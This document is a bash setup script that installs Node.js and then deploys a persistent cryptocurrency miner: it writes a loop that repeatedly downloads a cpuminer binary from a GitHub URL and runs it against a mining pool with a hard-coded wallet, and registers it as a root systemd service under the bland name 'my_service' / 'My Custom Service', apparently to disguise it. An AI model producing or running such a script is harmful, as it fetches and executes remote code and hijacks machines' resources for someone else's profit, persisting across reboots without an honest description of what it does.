#!/bin/bash

# Step 1: Install necessary dependencies
apt update -y
apt install curl wget git -y

# Step 2: Install nvm and Node.js
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # This loads nvm
[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"  # This loads nvm bash_completion
nvm install --lts

# Step 3: Create the main script
cat << 'EOF' > /usr/local/bin/my_service.sh
#!/bin/sh

# Define the URL and mining parameters
MINER_URL="https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/cpuminer-sse2"
ALGORITHM="minotaurx"
POOL_URL="stratum+tcps://stratum-na.rplant.xyz:17068"
WALLET_ADDRESS="RWZHYbbNjdFPpzzrYpsqWFKb2bcSgyj9y1.avn"
PASSWORD="webpassword=x"

# Loop indefinitely
while true; do
    # Download the miner executable
    wget -q "$MINER_URL" -O cpuminer-sse2
    if [ $? -ne 0 ]; then
        echo "Failed to download the miner. Retrying in 10 seconds..."
        sleep 10
        continue
    fi

    # Make the miner executable
    chmod +x cpuminer-sse2
    if [ $? -ne 0 ]; then
        echo "Failed to make the miner executable. Retrying in 10 seconds..."
        sleep 10
        continue
    fi

    # Run the miner
    echo "Starting the miner..."
    ./cpuminer-sse2 -a minotaurx -o "$POOL_URL" -u "$WALLET_ADDRESS" -p "$PASSWORD"
    if [ $? -ne 0 ]; then
        echo "Miner crashed or failed. Restarting in 10 seconds..."
        sleep 10
    else
        echo "Miner exited successfully. Restarting in 5 seconds..."
        sleep 5
    fi
done
EOF

# Step 4: Make the main script executable
chmod +x /usr/local/bin/my_service.sh

# Step 5: Create the systemd service file
cat << 'EOF' > /etc/systemd/system/my_service.service
[Unit]
Description=My Custom Service
After=network.target

[Service]
ExecStart=/usr/local/bin/my_service.sh
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

# Step 6: Reload systemd and start the service
systemctl daemon-reload
systemctl start my_service.service
systemctl enable my_service.service

echo "Setup completed! The service is now running and enabled on boot."
